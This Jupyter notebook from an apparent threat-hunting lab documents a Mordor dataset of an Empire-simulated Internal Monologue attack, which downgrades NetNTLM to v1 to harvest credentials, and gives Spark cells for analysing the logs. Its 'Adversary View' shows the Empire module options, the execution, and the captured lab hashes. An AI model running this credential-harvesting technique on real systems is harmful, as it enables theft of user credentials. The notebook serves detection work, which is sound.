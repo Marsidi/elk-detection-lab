{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Extended NetNTLM Downgrade"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-191225045202 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/12/25 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-InternalMonologue.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/small_datasets/windows/credential_access/empire_extended_netntlm_downgrade.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries downgrading the challenge/response authentication protocol used for network logons, the minimum security negotiated for applications using NTLMSSP, and security settings that restrict outgoing NTLM traffic to remote servers in an environment"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: XFLEZM9N) > usemodule credentials/invoke_internal_monologue*\n",
    "(Empire: powershell/credentials/invoke_internal_monologue) > info\n",
    "\n",
    "            Name: Invoke-InternalMonologue\n",
    "            Module: powershell/credentials/invoke_internal_monologue\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: False\n",
    "        Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "@eladshamir\n",
    "@4lex\n",
    "\n",
    "Description:\n",
    "Uses the Internal Monologue attack to force easily-\n",
    "decryptable Net-NTLMv1 responses over localhost and without\n",
    "directly touching LSASS.\n",
    "https://github.com/eladshamir/Internal-Monologue\n",
    "\n",
    "Comments:\n",
    "The underlying powershell function accepts switches that\n",
    "[DISABLE] default behaviours. The default settings will\n",
    "downgrade NetNTLM responses to v1, impersonate all users,\n",
    "use challenge 1122334455667788 and restore the registry to\n",
    "its original state. Set the options in this module to True\n",
    "in order to DISABLE the behaviours Disabling Downgrade and\n",
    "Impersonation yields higher OPSEC, but less than ideal loot\n",
    "\n",
    "Options:\n",
    "\n",
    "Name        Required    Value                     Description\n",
    "----        --------    -------                   -----------\n",
    "Agent       True        XFLEZM9N                  Agent to use for InternalMonologue      \n",
    "Challenge   True        1122334455667788          Net-NTLM Challenge to send              \n",
    "Downgrade   False                                 DISABLE downgrading to allow Net-NTLMv1 \n",
    "                                                    responses                               \n",
    "Impersonate False                                 DISABLE user impersonation and fetch    \n",
    "                                                    only current user                       \n",
    "Restore     False                                 DISABLE restoring the registry setting  \n",
    "                                                    that allowed v1 responses               \n",
    "Verbose     False                                 Verbose                                 \n",
    "\n",
    "(Empire: powershell/credentials/invoke_internal_monologue) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked XFLEZM9N to run TASK_CMD_WAIT\n",
    "[*] Agent XFLEZM9N tasked with task ID 2\n",
    "[*] Tasked agent XFLEZM9N to run module powershell/credentials/invoke_internal_monologue\n",
    "(Empire: powershell/credentials/invoke_internal_monologue) > pgustavo::shire:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:1122334455667788\n",
    "IT001$::shire:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:1122334455667788\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/small_datasets/windows/credential_access/empire_extended_netntlm_downgrade.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
